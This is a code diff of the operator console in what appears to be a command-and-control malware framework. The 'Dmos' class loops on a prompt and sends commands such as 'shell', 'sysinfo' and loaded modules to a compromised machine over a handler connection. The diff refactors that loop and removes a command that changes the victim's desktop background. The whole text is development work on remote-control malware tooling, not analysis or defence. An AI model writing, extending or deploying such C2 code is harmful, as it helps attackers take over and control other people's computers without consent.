@@ -23,19 +23,18 @@ class Dmos:
         self.c2             = c2
 
 
-    @safe_exec
     def interact(self):
         conn = self.conn
         modules_multi = self.c2.modules_multi
         while 1:
-            command = input(colored("[{}@{}]>> ".format(self.USERNAME, self.GLOBAL), 'cyan', attrs=['bold']))
+            command = input(colored(f"[{self.USERNAME}@{self.GLOBAL}]>> ", 'cyan', attrs=['bold']))
             cmd = command.split(' ')[0]
             args = command[len(cmd)+1:]
 
             if cmd in modules_multi.keys():
                 modules_multi[cmd]._exec(self, args)
             elif command == "free":
-                dmos.free_dmos()
+                self.free_dmos()
                 terminate(conn, self.c2.multi_handler.dmoss, self, "gracefully")
                 break
             elif command == "shell":
@@ -43,10 +42,7 @@ class Dmos:
             elif command == "sysinfo":
                 self.system_info()
             elif command == "fat":
-                self.send(command.encode())
-            elif command[:9] == "bgchange ":
-                a, path = command.split(' ')
-                self.background_changer(path)
+                self.conn.send(command.encode())
             elif command == "clear":
                 os.system("clear")
             elif command == "b":
